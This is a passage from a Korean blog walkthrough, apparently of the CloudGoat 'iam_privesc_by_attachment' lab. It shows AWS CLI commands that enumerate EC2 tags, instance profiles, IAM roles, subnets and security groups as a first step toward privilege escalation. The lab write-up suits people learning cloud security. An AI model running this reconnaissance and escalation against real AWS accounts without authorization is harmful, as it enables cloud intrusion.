class=\"language-bash\">aws ec2 describe-instances --query <span class=\"token string\">'Reservations[*].Instances[*].[Tags]'</span> <span class=\"token punctuation\">\\</span>\n--profile kerrigan</code></pre></div>\n<ul>\n<li>aws cli 기능에는 <code class=\"language-text\">query</code> 옵션을 통해서 출력 형식 json 배열의 모든 출력값을 필터링 할 수 있습니다. <code class=\"language-text\">Reservations[*].Instances[*].[Tags]</code> 형태로 <code class=\"language-text\">*</code> 와일드카드 형태로 표현식을 작성할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n<span class=\"token operator\">:</span>...skipping...\n<span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">[</span>...skipping...\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span>\n<span class=\"token operator\">:</span>...skipping...\n<span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">]</span>\n<span class=\"token operator\">:</span>...skipping...\n<span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"ec2-vulnerable-proxy-server-cloud_breach_s3_cgid63w57aulmi\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cloud-breach-s3\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">[</span>\n            <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Scenario\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"iam-privesc-by-attachment\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Stack\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat\"</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"Key\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Name\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"Value\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"CloudGoat iam_privesc_by_attachment_cgidmbi301d8zu super-critical-security-server EC2 Instance\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">]</span></code></pre></div>\n<ul>\n<li>해당 정보를 통해서 <code class=\"language-text\">cg-super-critical-security-server</code> 가 사용하다는 것을 알 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">super-critical-security-server</code></pre></div>\n<ul>\n<li>IAM 사용자 “Kerrigan” 으로서 우리는 EC2 “Instance Profile” 과 관련된 정보를 검색할 수 가 있습니다.</li>\n<li>인스턴스 프로파일은 Single IAM Rule Container입니다.</li>\n<li>EC2 인스턴스에 IAM Rule을 직접 할당할 수 는 없지만 Rule이 포함된 인스턴스 프로파일은 할당할 수 있습니다.</li>\n<li>사용 가능한 인스턴스 프로필등을 나열하여 확인해보았습니다.  아래의 명령을 통해 cloudgoat가 규칙으로 모든 리소스의 이름을 다음으로 <code class=\"language-text\">--query</code> 로 <code class=\"language-text\">cg</code> 로 시작하는 인스턴스 Rule을 쿼리하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws iam list-instance-profiles --query <span class=\"token string\">\"InstanceProfiles[?starts_with(InstanceProfileName, 'cg')]\"</span> --profile kerrigan\n\nInstanceProfileName -> (문자열)\n\n인스턴스 프로파일을 식별하는 이름입니다.</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABf0lEQVQoz31S147CQBBbeieEkEYIJRBK6AcIOF17uf//JJ88YRFI6B6sWW3GE9s7KggXyBctDEZrgePHMK0hao0u2p0ROk4kaLUHaLZ6dzSMFIYZwjD7sOwIpYoDFQ4SVOs+ev0E43iP1eYd08UR8eyAze4Dy80Vy/UFw2gjg213AtePYbtjgT6zlqsuVLc3R7MVYvf2hcXqLIPnyUkGWPborrJY7qBQegadETwXyzZyhTaU7URQqopKzYVpDYRMxWzgHzVIJCGbN6USerDKGlCqnlavO71Pp3QqjSY7bPefYv9w+sH++I3+cCXqmTO/S413ciYvzdBOM2x3hnC8iagjyQtmYBSj8VaIXncG15+KA/5YW9WgID7Ig+UalGrIRbK64Hz9lQfiw/DVSaA1IWQNZHKtJ4jV271yvDFUxrg1px+ZmR/MRLFeB50ZFZHILF9Bud4ESjXvF7o56CeSD9chRWq5UvP+H8jFfBzESjVcWobMBeeis0/b0n2vBv8B5gL2x5a+cc4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"7\"\n        title=\"7\"\n        src=\"/static/e3af4801ac89e6d317ae252a6e2c46e1/37523/7.png\"\n        srcset=\"/static/e3af4801ac89e6d317ae252a6e2c46e1/e9ff0/7.png 180w,\n/static/e3af4801ac89e6d317ae252a6e2c46e1/f21e7/7.png 360w,\n/static/e3af4801ac89e6d317ae252a6e2c46e1/37523/7.png 720w,\n/static/e3af4801ac89e6d317ae252a6e2c46e1/cc488/7.png 928w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token property\">\"InstanceProfileName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-meek-instance-profile-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token property\">\"RoleName\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu\"</span><span class=\"token punctuation\">,</span></code></pre></div>\n<ul>\n<li>AWS 게정에는 <code class=\"language-text\">cg-ec2-meek-instance-profile-[CLOUD_GOAT_ID]</code> , <code class=\"language-text\">cg-ec2-meek-role-[CLOUD_GOAT_ID]</code> 형태의 패턴으로 IAM Rule에 대한 정보를 확인할 수있습니다.</li>\n<li>IAM 사용자 kerrigan으로서 IAM Rule과 관련된 정보를 검색할수도 있습니다. 해당 부분에서 사용할 수 있는 IAM 역활들을 나열해 봤습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws iam list-roles --query <span class=\"token string\">\"Roles[?starts_with(RoleName, 'cg')]\"</span> --profile kerrigan</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 70%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB10lEQVQ4y41T127jMBCkUlwl0VaX5SJZ7jUNuMQH5DH//0cTzMqUU+6CPCxIguLszOxIKctFqxNjvf2DNFvBDwsEcYkwnsle98ewdQZHD9HzxnB7I/T9HEE0he0OoJQDZWkQx7ruQRGMj8r5PQbDFTa7ZyzWT9gdT7h/fEVeHpAMFojTuVSYzOozQf1wWjdotiModiaTxeoJm/0z8ukB++NJQKPz4yAqcdsMcNPwv1WjFaLRCmS9vvWg1JUW2pSz3b9gNNkiSubo+xN5IJJEViXpa8n7q2qtzjd9sHjgmmZLTIo9kmwpflFGx07FZ/PtT6UMmAGkH9loLd5QMvdkT9BfARogMqFPXWcg+1YnksmyjLT/gRiMmmG7myCMS3hhIQy7TiqsKn/tD/7oS1n6n01qQErzghwdO5F8kSn3vKN/nGK7G9fn6j49N3UvOSSg7WbYHU4YjjeyMuTM4d3DqwyImWNGec9hsTnTwJVpoBpWsx1C9byJfFiUR4zznXw0WzxgOrtDOlzJmcMhK8OUHrMq1okwpZoqZmc/CPby902A5stHASIAu3JYn/z7Wmc/a8mysbR05J9BL8mc3Y03v4mMDIXdLxPScHQGLyjEdN4ZsI9Z/QnwHYWuToIOK7dhAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"8\"\n        title=\"8\"\n        src=\"/static/aa89ce317f2ef72519163ed73e63236d/37523/8.png\"\n        srcset=\"/static/aa89ce317f2ef72519163ed73e63236d/e9ff0/8.png 180w,\n/static/aa89ce317f2ef72519163ed73e63236d/f21e7/8.png 360w,\n/static/aa89ce317f2ef72519163ed73e63236d/37523/8.png 720w,\n/static/aa89ce317f2ef72519163ed73e63236d/c0255/8.png 920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AWS 두 IAM Rule 계정을 확인할 수 가 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">cg-ec2-meek-role-iam_privesc_by_attachment_cgidmbi301d8zu\n\ncg-ec2-mighty-role-iam_privesc_by_attachment_cgidmbi301d8zu</code></pre></div>\n<ul>\n<li>RoleName에서 확인할 수 있듯이 meek, mighty 키워드를 통해 권한 레벨을 확인할 수 가 있습니다. 뜻 그대로 meek &#x3C; mighty 레벨 입니다. 이러한 권한 으로 인해 접근 제한이 되어 액세스 거부 문제가 발생할 수 있습니다.</li>\n</ul>\n<h3 id=\"권한-역활을-파악하는-방법\" style=\"position:relative;\"><a href=\"#%EA%B6%8C%ED%95%9C-%EC%97%AD%ED%99%9C%EC%9D%84-%ED%8C%8C%EC%95%85%ED%95%98%EB%8A%94-%EB%B0%A9%EB%B2%95\" aria-label=\"권한 역활을 파악하는 방법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>권한 역활을 파악하는 방법</h3>\n<ul>\n<li>EC2 인스턴스에 연결하고 EC2를 사용하여 역할 권한을 열거하는 것입니다.</li>\n<li>IAM 역할은 EC2에 직접 연결할 수 없으며 인스턴스 프로파일에 Wrapping되어야 합니다.</li>\n<li>해당 방법을 사용하려면 AWS 계정의 인스턴스 프로필을 사용하여 EC2 인스턴스를 생성할 수 있어야 합니다.</li>\n<li>EC2 인스턴스를 생성을 하기 전에 필요한 데이터가 있어야 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\"><span class=\"token number\">1</span>. EC2 Instance 를 시작할 subnet\n<span class=\"token number\">2</span>. EC2 Instance에 대한 SSH 액세스를 허용하는 보안 그룹\n<span class=\"token number\">3</span>. EC2 Instance에 SSH로 연결하는데 사용할 수 있는 SSH key-pair\n\n-> 삭제 대상 EC2 머신과 동일한 Subnet을 사용할 수 있습니다.\nsubnet-04d05182b53c1ff11</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7klEQVQY022OzU7CUBgFP6VA2kZo7y3UUqH1gsUAIiYQFQ0gvxFZ6MKtL+Ir+M5jQJcsJjmbMxkxrRtMq0eSXpOaLr3OHeFoRbU9JDVtOjrjvTBg7XTJbI1SMSc5j1xeYRX0P3/71PKRp+cF09mKyWTJfPnK+mVF4+2L9nTHZrvlozfnp/7Jd3PHTMVcxAbJeZT9Op5K0JVLfJ2gqwbbPUdEHGw3IowySl4Dv2KoBQlR2EQFBikqpKQRVyGWQuTsULKvPIb0B2OGoymP4yX34wX92wfyQRPbb1BWMYFT48pKSIt1dFHjuNXDcS89xi9DvWnTI5WYSQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"9\"\n        title=\"9\"\n        src=\"/static/588d8302d877fe5484458d00c4bd1492/37523/9.png\"\n        srcset=\"/static/588d8302d877fe5484458d00c4bd1492/e9ff0/9.png 180w,\n/static/588d8302d877fe5484458d00c4bd1492/f21e7/9.png 360w,\n/static/588d8302d877fe5484458d00c4bd1492/37523/9.png 720w,\n/static/588d8302d877fe5484458d00c4bd1492/b7877/9.png 891w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>인스턴스에서 필요한 subnet 부분을 쿼리로 검색한 결과 2개의 데이터가 출력이 되었습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"json\"><pre class=\"language-json\"><code class=\"language-json\">aws ec2 describe-instances \\\n    --query 'Reservations<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span>.Instances<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span>.<span class=\"token punctuation\">[</span>SecurityGroups<span class=\"token punctuation\">]</span>' \\\n    --output text --profile kerrigan\n\nsg-04ffcf8e873ee2103    cg-ec2-ssh-iam_privesc_by_attachment_cgidmbi301d8zu\nsg-063079fb3bea2c77e    cg-ec2-http-iam_privesc_by_attachment_cgidmbi301d8zu</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+ElEQVQY01XOW0+CcACGcSxn2VA0TcSYC0Hw0F9seCBMUPFYzWrW+jpd9bWfJhetLp797t690uQhZhFvGQwDptGKOJzT3n2ixR/MwxnxaMFXYct3451DyaTndMnKGjlFp1i6oVwxuSwbiUqxjqRqNnq9y/lFNdGyPYyGwGz0MKw+dntIrSnIFGpkchqyoiPnrzlJF0mdFhL/JjUdj7tBxPh+laTWHEyrT6vlJWMd4WO7PropcISP0xlRqVqcZSukM6Xf0aPHpMl0zWb3xnK1Z7l+wbZdRLDGDZ+JZlsW4SOvYsPB3/M0jvFHEbduQFf4XKkWUir/7+EPpSdz1axWD8wAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"10\"\n        title=\"10\"\n        src=\"/static/d1363b714e2aa9dad4e05742f0d68a9e/37523/10.png\"\n        srcset=\"/static/d1363b714e2aa9dad4e05742f0d68a9e/e9ff0/10.png 180w,\n/static/d1363b714e2aa9dad4e05742f0d68a9e/f21e7/10.png 360w,\n/static/d1363b714e2aa9dad4e05742f0d68a9e/37523/10.png 720w,\n/static/d1363b714e2aa9dad4e05742f0d68a9e/4ef49/10.png 890w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>앞서 출력된 서브넷 정보와 보안 그룹을 열거하고 EC2 인스턴스에 대한 SSH 